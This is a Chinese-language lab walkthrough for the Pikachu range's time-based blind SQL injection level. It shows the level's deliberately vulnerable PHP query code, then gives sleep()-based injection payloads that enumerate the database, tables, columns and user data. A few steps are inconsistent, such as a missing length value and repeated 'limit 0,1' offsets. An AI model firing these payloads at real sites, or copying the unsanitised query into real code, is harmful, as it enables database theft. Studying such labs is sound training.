# 基于时间的盲注

# 一、代码审计

该关卡的代码如下

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "sqli_blind_t.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','','','','','','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}

$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";


$link=connect();

$html='';

if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述
//     $result=execute($link, $query);
//    $html.="<p class='notice'>i don't care who you are!</p>";
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断
            $html.="<p class='notice'>i don't care who you are!</p>";
        }
    }else{

        $html.="<p class='notice'>i don't care who you are!</p>";
    }
}


?>


<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="../sqli.php">sqli</a>
                </li>
                <li class="active">基于时间的盲注</li>
            </ul><!-- /.breadcrumb -->
            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="admin/123456">
                点一下提示~
            </a>


        </div>
        <div class="page-content">

            <div id="sqli_main">
                <p class="sqli_title">what's your username?</p>
                <form method="get">
                    <input class="sqli_in" type="text" name="name" />
                    <input class="sqli_submit" type="submit" name="submit" value="查询" />
                </form>
                <?php echo $html;?>
            </div>




        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```

通过观察该关卡的代码，发现其没有对SQL注入进行防护

***

# 二、通关教程

当输入任何数据后返回的信息都是同一个时，可以尝试时间盲注，同过网页加载的时间判断是否存在注入

判断注入

测试闭合符号为"时页面返回时间正常，当测试闭合符号为'时页面返回时间为2秒，则该页面存在时间盲注且闭合符号为'

```
?name=allen" and sleep(2)%23		# 返回时间4毫秒
?name=allen' and sleep(2)%23		# 返回时间2秒
```

![image-20230307145443376](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230307145443376.png)

猜数据库名长度

猜数据库名长度为8个字符时，如果条件成立则延时2秒返回查询结果，以下返回的时间可以判断该数据库长度为个字符

```
?name=allen' and if(length(database())>=8,sleep(2),1)%23		# 返回时间4毫秒
?name=allen' and if(length(database())>=7,sleep(2),1)%23		# 返回时间2秒

# SQL语句如下
mysql> select id,email from member where username='allen' and if(length(database())>=8,sleep(2),1);
+----+-------------------+
| id | email             |
+----+-------------------+
|  2 | allen@pikachu.com |
+----+-------------------+
1 row in set (0.00 sec)

mysql> select id,email from member where username='allen' and if(length(database())>=7,sleep(2),1);
Empty set (2.00 sec)
```

![image-20230307145621545](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230307145621545.png)

猜数据库名

与布尔盲注类似，将查询的语句套入if条件语句中，查看页面返回的时间即可，不多概述

```
?name=allen' and if(ascii(substr(database(),1,1))>=112,sleep(2),1)%23	# 第一位112
?name=allen' and if(ascii(substr(database(),2,1))>=105,sleep(2),1)%23	# 第二位105

// 按顺序猜出7位数的数据库名，得到库名为pikachu
```

猜数据表

```
# 猜数据表个数
?name=allen' and if((select count(table_name) from information_schema.tables where table_schema=database())>=5,sleep(2),1)%23
// 得出该数据库的数据表的个数为5个

# 猜表名长度
?name=allen' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>=8,sleep(2),1)%23		# 第一张表表名长度为8
?name=allen' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>=6,sleep(2),1)%23		# 第二张表表名长度为6
// 按顺序将所有表的表名长度猜出来 (8|6|7|5|8)

# 猜表名
?name=allen' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>=104,sleep(2),1)%23
// 通过修改limit、substr值来限制查询位置与个数，按顺序猜出每个表的表名(httpinfo|member|message|users|xssblind)
```

猜字段

```
# 猜字段个数
?name=allen' and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)>=4,sleep(2),1)%23
// 按顺序猜出所有表的字段个数(6|7|3|4|4)

# 猜字段名长度
?name=allen' and if(length((select column_name from information_schema.columns where table_schema=database() and table_name='users'  limit 0,1))>=2,sleep(2),1)%23
// 按顺序猜出所有表的所有字段名长度 (users: 2|8|8|5)

# 猜字段名
?name=allen' and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))>104,sleep(2),1)%23
// 按顺序猜出所有表的所有字段名 (users: id|username|password|level)
```

猜内容

```
# 猜内容个数
?name=allen' and if((select count(id) from users)>=3,sleep(2),1)%23
// 按顺序猜出所有数据表所有字段的内容个数

# 猜内容长度
?name=allen' and if(length((select username from users limit 0,1))>=5,sleep(2),1)%23
// 按顺序猜出所有数据表的所有所有字段内容的长度

# 猜字段内容
?name=allen' and if(ascii(substr((select username from users limit 0,1),1,1))>=97,sleep(2),1)%23
// 按顺序猜出所有字段的内容
```

